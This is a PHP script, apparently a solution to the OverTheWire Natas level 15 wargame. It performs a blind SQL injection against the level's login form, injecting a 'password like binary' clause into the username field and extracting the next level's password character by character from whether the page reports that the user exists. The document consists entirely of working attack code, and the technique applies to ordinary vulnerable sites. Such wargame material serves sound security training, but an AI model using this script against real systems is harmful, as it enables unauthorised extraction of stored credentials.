<?php
$injectionString = 'natas16" and password like binary "';

$ifUserExists = function ($injectionString) use ($argv) {
    $ch = curl_init('http://natas15.natas.labs.overthewire.org/index.php');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Authorization: Basic ' . $argv[1],
    ]);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'username=' . $injectionString);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    return strpos($output, 'This user exists') !== false;
};

$dictionary = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

$password = '';
while ($ifUserExists($injectionString . $password . '%')) {
    $startStepLength = strlen($password);
    foreach (str_split($dictionary) as $char) {
        $testString = $injectionString . $password . $char . '%';
        $test = $ifUserExists($testString);
        echo '.';
        if ($ifUserExists($testString)) {
            $password .= $char;
            echo "\n" . $password . "\n";
            break;
        }
    }
    if ($startStepLength === strlen($password)) {
        break;
    }
}

echo $password;

